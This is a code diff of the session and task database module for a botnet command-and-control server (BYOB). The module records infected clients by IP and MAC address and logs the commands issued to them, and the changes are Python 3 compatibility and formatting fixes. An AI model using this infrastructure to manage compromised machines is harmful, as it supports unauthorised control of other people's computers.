@@ -4,30 +4,34 @@
 
 # standard library
 import os
-import sys
-import md5
 import json
 import sqlite3
+import hashlib
 import datetime
 import collections
 
 # modules
 import util
 
+try:
+    unicode        # Python 2
+except NameError:
+    unicode = str  # Python 3
+
 class Database(sqlite3.Connection):
-    """ 
+    """
     Builds and manages a persistent Sqlite3 database for the
     sessions & tasks handled by byob.server.Server instances
 
     """
     _tbl_tasks = """BEGIN TRANSACTION;
 CREATE TABLE IF NOT EXISTS tbl_tasks (
-    id serial, 
-    uid varchar(32) NOT NULL, 
+    id serial,
+    uid varchar(32) NOT NULL,
     session varchar(32) NOT NULL,
-    task text DEFAULT NULL, 
-    result text DEFAULT NULL, 
-    issued DATETIME DEFAULT NULL, 
+    task text DEFAULT NULL,
+    result text DEFAULT NULL,
+    issued DATETIME DEFAULT NULL,
     completed DATETIME DEFAULT NULL
 );
 COMMIT;
@@ -53,7 +57,7 @@ COMMIT;
 """
 
     def __init__(self, database=':memory:'):
-        """ 
+        """
         Create new Sqlite3 Conection instance and setup the BYOB database
 
         `Optional`
@@ -144,26 +148,26 @@ COMMIT;
         return len(self.get_sessions(verbose=False))
 
     def debug(self, output):
-        """ 
+        """
         Print debugging output to console
         """
         util.log(str(output), level='debug')
 
     def error(self, output):
-        """ 
+        """
         Print error output to console
         """
         util.log(str(output), level='error')
 
     def exists(self, uid):
-    	""" 
-    	Check if a client exists in the database
-    	"""
-    	result = bool(len([_ for _ in self.execute("select * from tbl_sessions where uid=:uid", {"uid": uid})]))
+        """
+        Check if a client exists in the database
+        """
+        result = bool(len([_ for _ in self.execute("select * from tbl_sessions where uid=:uid", {"uid": uid})]))
         return result
 
     def update_status(self, session, online):
-        """ 
+        """
         Update session status to online/offline
 
         `Required`
@@ -186,7 +190,7 @@ COMMIT;
             self.error("{} error: {}".format(self.update_status.func_name, str(e)))
 
     def get_sessions(self, verbose=False):
-        """ 
+        """
         Fetch sessions from database
 
         `Optional`
@@ -200,7 +204,7 @@ COMMIT;
         return [{k:v for k,v in zip(columns, rows)} for rows in statement.fetchall()]
 
     def get_tasks(self):
-        """ 
+        """
         Fetch tasks from database
 
         `Optional`
@@ -215,7 +219,7 @@ COMMIT;
         return [{k:v for k,v in zip(columns, rows)} for rows in statement.fetchall()]
 
     def handle_session(self, info):
-        """ 
+        """
         Handle a new/current client by adding/updating database
 
         `Required`
@@ -225,11 +229,8 @@ COMMIT;
         """
         if isinstance(info, dict):
 
-            if not info.get('id'):
-                info['id'] = (self._count_sessions() + 1)
-
             if not info.get('uid'):
-                info['uid'] = md5.new(info['public_ip'] + info['mac_address']).hexdigest()
+                info['uid'] = hashlib.md5(info['public_ip'] + info['mac_address']).hexdigest()
                 info['joined'] = datetime.datetime.now()
 
             info['online'] = 1
@@ -239,13 +240,13 @@ COMMIT;
             newclient = False
             if not self.exists(info['uid']):
                 newclient = True
-                self.execute_query("insert into tbl_sessions ({}) values (:{})".format(','.join(info.keys()), ',:'.join(info.keys())), params=info, returns=False, display=False)                
+                self.execute_query("insert into tbl_sessions ({}) values (:{})".format(','.join(info.keys()), ',:'.join(info.keys())), params=info, returns=False, display=False)
             else:
                 self.execute_query("update tbl_sessions set online=:online, sessions=:sessions, last_online=:last_online where uid=:uid", params=info, returns=False, display=False)
 
             for row in self.execute("select * from tbl_sessions where uid=:uid", info):
-        	    if isinstance(row, dict):
-        	        info = row
+                if isinstance(row, dict):
+                    info = row
                     break
 
             if newclient:
@@ -258,7 +259,7 @@ COMMIT;
             self.error("Error: invalid input type received from server (expected '{}', receieved '{}')".format(dict, type(info)))
 
     def handle_task(self, task):
-        """ 
+        """
         Adds issued tasks to the database and updates completed tasks with results
 
         `Task`
@@ -274,7 +275,7 @@ COMMIT;
         """
         if isinstance(task, dict):
             if 'uid' not in task:
-                task['uid'] = md5.new(task['session'] + task['task'] + datetime.datetime.now().ctime()).hexdigest()
+                task['uid'] = hashlib.md5(task['session'] + task['task'] + datetime.datetime.now().ctime()).hexdigest()
                 task['issued'] = datetime.datetime.now()
                 self.execute_query('insert into tbl_tasks (uid, session, task, issued) values (:uid, :session, :task, :issued)', params={"uid": task['uid'],  "session": task['session'], "task": task['task'], "issued": task['issued']}, returns=False)
                 task['issued'] = task['issued'].ctime()
@@ -291,7 +292,7 @@ COMMIT;
             self.debug("{} error: invalid input type (expected {}, received {})".format(self.handle_task.func_name, dict, type(task)))
 
     def execute_query(self, stmt, params={}, returns=True, display=False):
-        """ 
+        """
         Query the database with a SQL statement and return result
 
         `Required`
@@ -317,7 +318,7 @@ COMMIT;
             return result
 
     def execute_file(self, filename=None, sql=None, returns=True, display=False):
-        """ 
+        """
         Execute SQL commands sequentially from a string or file
 
         `Optional`
